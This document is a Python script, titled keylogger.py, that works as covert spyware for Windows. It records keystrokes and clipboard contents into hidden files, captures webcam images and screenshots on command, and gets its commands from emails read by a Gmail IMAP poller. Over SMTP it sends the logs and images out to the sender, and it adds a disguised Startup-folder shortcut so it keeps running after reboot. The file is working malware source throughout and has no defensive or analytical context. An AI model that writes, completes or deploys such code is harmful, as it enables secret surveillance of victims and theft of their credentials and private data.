"""
keylogger.py — Captures keystrokes + clipboard in parallel, saving to separate files.

Controls:
    • Press F9 to stop both threads and exit.
    • Ctrl+C in the terminal also stops everything cleanly.

Requirements:
    pip install pynput pyperclip
"""

import datetime
import sys
import threading
import time
import cv2
import pyautogui
from pathlib import Path
import pyperclip
from pynput import keyboard
import imaplib
import email
import smtplib
from email.header import decode_header
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import ctypes

imaplib.Debug=0

# ── Configuration ──────────────────────────────────────────────────────────────

OUTPUT_FILE      = Path("keylog.txt")   # keystroke log
CLIP_OUTPUT_FILE = Path("temp.log")     # clipboard log
STOP_KEY_NAME    = "f9"                 # key that stops the logger
CLIP_INTERVAL    = 5.0                  # clipboard poll interval in seconds

IMAP_HOST     = "imap.gmail.com"
SMTP_HOST     = "smtp.gmail.com"
SMTP_PORT     = 587
IMAP_PORT     = 993
EMAIL_ADDRESS = "you@gmail.com"
EMAIL_PASS    = "<APP PASSWORD>"
POLL_INTERVAL = 2
CAM_OUTPUT_FILE = Path("webcam.jpg")
SS_OUTPUT_FILE  = Path("screenshot.png")
FILE_ATTRIBUTE_HIDDEN = 0x02
SHORTCUT_PATH=None

log_lock = threading.Lock()

# ── Shared stop event ──────────────────────────────────────────────────────────

stop_event = threading.Event() 

## cleanup

def cleanup(sender: str):
    """Delete the output file and the startup shortcut."""
    print("\n[!] Ctrl+C detected — cleaning up...")
 
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)

    if os.path.exists(CLIP_OUTPUT_FILE):
        os.remove(CLIP_OUTPUT_FILE)

    if os.path.exists(CAM_OUTPUT_FILE):
        os.remove(CAM_OUTPUT_FILE)

    if os.path.exists(SS_OUTPUT_FILE):
        os.remove(SS_OUTPUT_FILE)
 
    if SHORTCUT_PATH and os.path.exists(SHORTCUT_PATH):
        os.remove(SHORTCUT_PATH)
    else:
        print(f"[~] Shortcut not found (already gone?): {SHORTCUT_PATH}")
 
    print("[✓] Cleanup complete. Goodbye!")


# ── Keystroke helpers ──────────────────────────────────────────────────────────

def resolve_stop_key(name: str):
    try:
        return keyboard.Key[name]
    except KeyError:
        if len(name) == 1:
            return keyboard.KeyCode.from_char(name)
        print(f"[ERROR] Unknown stop key: '{name}'. "
              "Use a pynput Key name (f9, esc, …) or a single character.")
        sys.exit(1)

STOP_KEY = resolve_stop_key(STOP_KEY_NAME)

def format_key(key) -> str:
    try:
        return key.char if key.char is not None else f"[{key}]"
    except AttributeError:
        name = str(key).replace("Key.", "")
        special = {
            "space": " ", "enter": "\n", "tab": "\t",
            "backspace": "[BACKSPACE]", "caps_lock": "[CAPS_LOCK]",
            "shift": "[SHIFT]",     "shift_r": "[SHIFT]",
            "ctrl_l": "[CTRL]",     "ctrl_r": "[CTRL]",
            "alt_l": "[ALT]",       "alt_r": "[ALT]",
            "cmd": "[CMD]",         "delete": "[DELETE]",
            "home": "[HOME]",       "end": "[END]",
            "page_up": "[PAGE_UP]", "page_down": "[PAGE_DOWN]",
            "up": "[UP]",           "down": "[DOWN]",
            "left": "[LEFT]",       "right": "[RIGHT]",
            "esc": "[ESC]",
            "f1": "[F1]",  "f2": "[F2]",  "f3": "[F3]",  "f4": "[F4]",
            "f5": "[F5]",  "f6": "[F6]",  "f7": "[F7]",  "f8": "[F8]",
            "f9": "[F9]",  "f10": "[F10]","f11": "[F11]","f12": "[F12]",
        }
        return special.get(name, f"[{name.upper()}]")
    

def decode_str(value: str) -> str:
    parts = decode_header(value)
    return "".join(
        part.decode(enc or "utf-8") if isinstance(part, bytes) else part
        for part, enc in parts
    )

def get_sender_address(raw: str) -> str:
    """Extract plain email address from 'Name <email@x.com>'."""
    if "<" in raw:
        return raw.split("<")[1].rstrip(">").strip()
    return raw.strip()

def connect_imap() -> imaplib.IMAP4_SSL:
    mail = imaplib.IMAP4_SSL(IMAP_HOST, IMAP_PORT)
    mail.login(EMAIL_ADDRESS, EMAIL_PASS)
    return mail

#------------GMAIL POLLER-------------------------------------------------------
class GmailPoller(threading.Thread):
    def __init__(self, executor: ThreadPoolExecutor, stop_event: threading.Event):
        super().__init__(name="GmailPoller", daemon=True)
        self.executor   = executor
        self.stop_event = stop_event
        self.mail       = None

    def run(self):
        print("Poller started.")
        self.mail = connect_imap()
        while not self.stop_event.is_set():
            try:
                self.poll()
            except imaplib.IMAP4.abort:
                print("Connection dropped, reconnecting...")
                self.mail = connect_imap()
            except Exception as e:
                print(f"Polling error: {e}")
            self.stop_event.wait(POLL_INTERVAL)
        try:
            self.mail.logout()
        except Exception:
            pass

    def poll(self):
        self.mail.select("INBOX")
        today = datetime.date.today().strftime("%d-%b-%Y")
        status, data = self.mail.search(None, f'(UNSEEN SINCE "{today}" FROM "{EMAIL_ADDRESS}")')
        if status != "OK" or not data[0]:
            return

        for msg_id in data[0].split():
            try:
                self.process(msg_id)
            except Exception as e:
                print(f"Error processing message: {e}")

    def process(self, msg_id: bytes):
        status, data = self.mail.fetch(msg_id, "(RFC822)")
        if status != "OK":
            return

        msg    = email.message_from_bytes(data[0][1])
        subject = decode_str(msg.get("Subject", "")).strip()
        sender  = get_sender_address(msg.get("From", ""))

        print(f"Received: subject={subject!r} from={sender!r}")

        func = COMMAND_MAP.get(subject.lower())
        if func:
            self.mail.store(msg_id, "+FLAGS", "\\Seen")
            self.executor.submit(self._run, func, sender, subject)

    def _run(self, func, sender: str, subject: str):
        try:
            func(sender)
            print(f"'{subject}' completed.")
        except Exception as e:
            print(f"'{subject}' failed: {e}")

# ── Keystroke thread ───────────────────────────────────────────────────────────

def run_keylogger(stop_event: threading.Event) -> None:
    log_file = OUTPUT_FILE.open("a", encoding="utf-8")
    ctypes.windll.kernel32.SetFileAttributesW(str(OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        log_file.write(f"--- Recording started at {ts} ---\n")
        log_file.flush()

    def write(text: str):
        with log_lock:
            log_file.write(text)
            log_file.flush()

    def on_press(key):
        if stop_event.is_set():
            return False

        if key == STOP_KEY:
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write(f"\n\n--- Recording stopped at {ts} ---\n")
            with log_lock:
                log_file.close()
            print(f"\n[keylog] Stop key pressed. Saved to '{OUTPUT_FILE}'.")
            stop_event.set()
            return False

        write(format_key(key))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    if not log_file.closed:
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with log_lock:
            log_file.write(f"\n\n--- Recording interrupted at {ts} ---\n")
            log_file.close()
# ── Webcam image and desktop screenshot ────────────────────────────────────────
def capture_webcam(sender: str):
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        print("capture_webcam: could not open camera.")
        return

    ret, frame = cam.read()
    cam.release()

    if not ret:
        print("capture_webcam: failed to capture frame.")
        return

    cv2.imwrite(str(CAM_OUTPUT_FILE), frame)
    ctypes.windll.kernel32.SetFileAttributesW(str(CAM_OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
    print(f"Webcam image saved to {CAM_OUTPUT_FILE}")

    # Send it back via email
    msg = MIMEMultipart()
    msg["From"]    = EMAIL_ADDRESS
    msg["To"]      = sender
    msg["Subject"] = "Webcam capture"

    with open(CAM_OUTPUT_FILE, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename=webcam.jpg")
    msg.attach(part)

    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASS)
            server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
        print(f"Webcam image sent to {sender}")
    except Exception as e:
        print(f"capture_webcam: failed to send email: {e}")

    print(f"Webcam image sent to {sender}")


def capture_screenshot(sender: str):
    screenshot = pyautogui.screenshot()
    screenshot.save(str(SS_OUTPUT_FILE))
    ctypes.windll.kernel32.SetFileAttributesW(str(SS_OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
    print(f"Screenshot saved to {SS_OUTPUT_FILE}")

    # Send it back via email
    msg = MIMEMultipart()
    msg["From"]    = EMAIL_ADDRESS
    msg["To"]      = sender
    msg["Subject"] = "Desktop screenshot"

    with open(SS_OUTPUT_FILE, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename=screenshot.png")
    msg.attach(part)

    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASS)
            server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
        print(f"Screenshot sent to {sender}")
    except Exception as e:
        print(f"capture_screenshot: failed to send email: {e}")

    print(f"Screenshot sent to {sender}")        
# ── Clipboard monitor thread ───────────────────────────────────────────────────

def run_clipboard_monitor(stop_event: threading.Event)->None:
    clip_file = CLIP_OUTPUT_FILE.open("a", encoding="utf-8")
    ctypes.windll.kernel32.SetFileAttributesW(str(CLIP_OUTPUT_FILE), FILE_ATTRIBUTE_HIDDEN)
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clip_file.write(f"--- Clipboard monitor started at {ts} ---\n")
    clip_file.flush()

    last_value = None

    # Seed with whatever is already on the clipboard (skip logging it)
    try:
        last_value = pyperclip.paste()
    except Exception:
        pass

    while not stop_event.is_set():
        # Sleep in small increments so we react to stop_event quickly
        for _ in range(int(CLIP_INTERVAL * 10)):
            if stop_event.is_set():
                break
            time.sleep(0.1)

        if stop_event.is_set():
            break

        try:
            current = pyperclip.paste()
        except Exception as exc:
            print(f"[clipboard] Warning: could not read clipboard — {exc}")
            continue

        if current and current != last_value:
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry = f"[{ts}]\n{current}\n{'-' * 40}\n"
            clip_file.write(entry)
            clip_file.flush()
            print(f"[clipboard] New entry captured ({len(current)} chars)")
            last_value = current

    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clip_file.write(f"--- Clipboard monitor stopped at {ts} ---\n")
    clip_file.close()
    print(f"[clipboard] Saved to '{CLIP_OUTPUT_FILE}'.")

# ---IMAP/SMTP --------------------------------------------------------------------

def send_log(sender: str):
    for filepath in [OUTPUT_FILE, CLIP_OUTPUT_FILE]:
        if not filepath.exists():
            print(f"send_log: {filepath.name} does not exist yet.")
            return
        
    msg = MIMEMultipart()
    msg["From"]    = EMAIL_ADDRESS
    msg["To"]      = sender
    msg["Subject"] = "log file / captured keystrokes and clipboard"

    for filepath in [OUTPUT_FILE, CLIP_OUTPUT_FILE]:
        with log_lock:                               # wait for any active write to finish
            with open(filepath, "rb") as f:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={filepath.name}")
        msg.attach(part)

    try:
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASS)
            server.sendmail(EMAIL_ADDRESS, sender, msg.as_string())
        print(f"Sent logs to {sender}")
    except Exception as e:
        print(f"send_log: failed to send email: {e}")

    print(f"Sent logs to {sender}")

COMMAND_MAP = {
    "log": send_log,
    "cam": capture_webcam,
    "ss":  capture_screenshot,
    "destruct": cleanup,
}

## staruup shortcut for  persistence
def create_startup_shortcut():
    """Create a shortcut to this script in the Windows Startup folder."""
    try:
        import win32com.client
    except ImportError:
        print(
            "[!] pywin32 is not installed. Run:  pip install pywin32\n"
            "    Then re-run this script to create the startup shortcut."
        )
        return
    global SHORTCUT_PATH
    # Resolve absolute path to this script
    script_path = os.path.abspath(__file__)
 
    # Windows Startup folder path
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup",
    )
 
    shortcut_path = os.path.join(startup_folder, "script.lnk")
    
    SHORTCUT_PATH = Path(shortcut_path)

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
 
    # Point the shortcut at the Python interpreter so it runs the script
    shortcut.TargetPath = sys.executable          # e.g. C:\Python312\python.exe
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.Description = "startup script"
    shortcut.WindowStyle = 7
    shortcut.Save()
 
    print(f"[+] Startup shortcut created:\n    {shortcut_path}")


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    
    
    # stop_event = threading.Event()

    # Clipboard thread — daemon so it dies if main thread crashes
    

    # Keystroke listener runs on the main thread (required on macOS)

                

    # Wait for clipboard thread to finish writing before exit
    
    

    print("[INFO] Starting keystroke logger + clipboard monitor.")
    print(f"       Keystrokes : {OUTPUT_FILE.resolve()}")
    print(f"       Clipboard  : {CLIP_OUTPUT_FILE.resolve()}  (poll every {CLIP_INTERVAL}s)")
    print(f"       Stop       : press {STOP_KEY_NAME.upper()} or Ctrl+C\n")

    poller=None
    clip_thread=None
    try:
        create_startup_shortcut()
        clip_thread = threading.Thread(target=run_clipboard_monitor,args=(stop_event,), daemon=True)
        clip_thread.start()
        with ThreadPoolExecutor(max_workers=5, thread_name_prefix="Worker") as executor:
            poller = GmailPoller(executor, stop_event)
            poller.start()
            run_keylogger(stop_event)
    except KeyboardInterrupt:
        print("Interrupted.")
    finally:
        stop_event.set()
        if poller:
            poller.join()
        if clip_thread:
            clip_thread.join(timeout=CLIP_INTERVAL + 1)
    return 0

if __name__ == "__main__":
    main()
